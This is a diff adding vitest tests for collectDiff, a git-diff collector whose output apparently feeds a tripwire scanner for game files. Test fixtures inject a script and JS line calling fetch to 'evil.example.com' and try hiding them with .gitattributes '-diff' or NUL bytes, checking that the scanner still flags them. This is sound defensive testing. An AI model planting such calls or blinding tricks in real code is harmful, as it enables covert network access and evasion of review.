@@ -1,11 +1,11 @@
 // collectDiff against a real temp git repo (no vitest-in-vitest: the test counter is injected).
 import { execFileSync } from 'node:child_process';
-import { mkdirSync, mkdtempSync, readFileSync, renameSync, rmSync, symlinkSync, unlinkSync, writeFileSync } from 'node:fs';
+import { chmodSync, mkdirSync, mkdtempSync, readFileSync, renameSync, rmSync, symlinkSync, unlinkSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { dirname, join } from 'node:path';
 import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest';
 import { checkTripwires } from '@studio/core/hal';
-import { collectDiff, countArrayItems, runGit, type GitRunner } from './git.js';
+import { collectDiff, countArrayItems, runGit, vitestCounts, type GitRunner } from './git.js';
 
 const gitIn = (cwd: string, ...args: string[]) => execFileSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@t', '-c', 'commit.gpgsign=false', ...args], { cwd, encoding: 'utf8' }).trim();
 const put = (root: string, rel: string, data: string | Buffer) => { mkdirSync(dirname(join(root, rel)), { recursive: true }); writeFileSync(join(root, rel), data); };
@@ -129,5 +129,67 @@ describe('collectDiff (temp git repo)', () => {
 
   it('runGit rejects on a git failure', async () => {
     await expect(runGit(['rev-parse', '--verify', 'no-such-ref'], root)).rejects.toThrow();
+  });
+});
+
+describe('collectDiff fail-closed and binary-blinding defences', () => {
+  const counts = async () => ({ before: 1, after: 1, beforeByFile: { 'a.test.ts': 2 }, afterByFile: { 'a.test.ts': 2 } });
+  const mk = () => {
+    const r = mkdtempSync(join(tmpdir(), 'hal-git2-'));
+    gitIn(r, 'init', '-q', '-b', 'main');
+    put(r, 'games/g/index.html', '<p>hi</p>\n');
+    put(r, 'games/g/a.js', 'a\n');
+    put(r, 'games/g/data.dat', 'plain\n');
+    gitIn(r, 'add', '-A'); gitIn(r, 'commit', '-q', '-m', 'b');
+    return r;
+  };
+  it('a .gitattributes -diff or a NUL byte cannot hide a text file: html/js are always decoded and scanned', async () => {
+    const r = mk();
+    try {
+      put(r, '.gitattributes', '*.html -diff\n*.js -diff\n');
+      put(r, 'games/g/index.html', '<p>hi</p>\n<script>fetch("https://evil.example.com")</script>\n');
+      put(r, 'games/g/a.js', 'a\n\0\nfetch("https://evil.example.com")\n');
+      put(r, 'games/g/data.dat', Buffer.from([0, 1, 2]));
+      const d = await collectDiff(r, 'HEAD', { countTests: counts });
+      const by = (p: string) => d.files.find((f) => f.path === p)!;
+      expect(by('games/g/index.html')).toMatchObject({ binary: false, before: '<p>hi</p>\n' });
+      expect(by('games/g/index.html').after).toContain('evil.example.com');
+      expect(by('games/g/a.js')).toMatchObject({ binary: false });
+      expect(by('games/g/a.js').after).toContain('fetch(');
+      expect(by('games/g/data.dat').binary).toBe(true);
+      const rules = checkTripwires(d).map((v) => v.rule);
+      expect(rules).toEqual(expect.arrayContaining(['network', 'protected-path', 'asset-source']));
+    } finally { rmSync(r, { recursive: true, force: true }); }
+  });
+  it('throws (fail closed) when a changed path cannot be read', async () => {
+    if (process.getuid?.() === 0) return; // root ignores file modes
+    const r = mk();
+    try {
+      put(r, 'games/g/a.js', 'changed\n');
+      chmodSync(join(r, 'games/g/a.js'), 0o000);
+      await expect(collectDiff(r, 'HEAD', { countTests: counts })).rejects.toThrow();
+    } finally { chmodSync(join(r, 'games/g/a.js'), 0o644); rmSync(r, { recursive: true, force: true }); }
+  });
+  it('throws when git show fails for a modified file, and when a path is neither file nor symlink', async () => {
+    const r = mk();
+    try {
+      put(r, 'games/g/a.js', 'changed\n');
+      const failing: GitRunner = async (args, cwd) => { if (args[0] === 'show') throw new Error('boom'); return runGit(args, cwd); };
+      await expect(collectDiff(r, 'HEAD', { git: failing, countTests: counts })).rejects.toThrow('boom');
+      const fake: GitRunner = async (args, cwd) => (args[0] === 'ls-files' && args.includes('--others') ? 'games/g/sub\0' : runGit(args, cwd));
+      mkdirSync(join(r, 'games/g/sub'));
+      await expect(collectDiff(r, 'HEAD', { git: fake, countTests: counts })).rejects.toThrow('not a regular file');
+    } finally { rmSync(r, { recursive: true, force: true }); }
+  });
+  it('passes per-file test counts through to the Diff', async () => {
+    const r = mk();
+    try {
+      const d = await collectDiff(r, 'HEAD', { countTests: counts });
+      expect(d.testCountsByFile).toEqual({ before: { 'a.test.ts': 2 }, after: { 'a.test.ts': 2 } });
+    } finally { rmSync(r, { recursive: true, force: true }); }
+  });
+  it('vitestCounts throws when git archive fails (bad base), instead of counting an empty tree', async () => {
+    const r = mk();
+    try { await expect(vitestCounts(r, 'no-such-ref')).rejects.toThrow(); } finally { rmSync(r, { recursive: true, force: true }); }
   });
 });
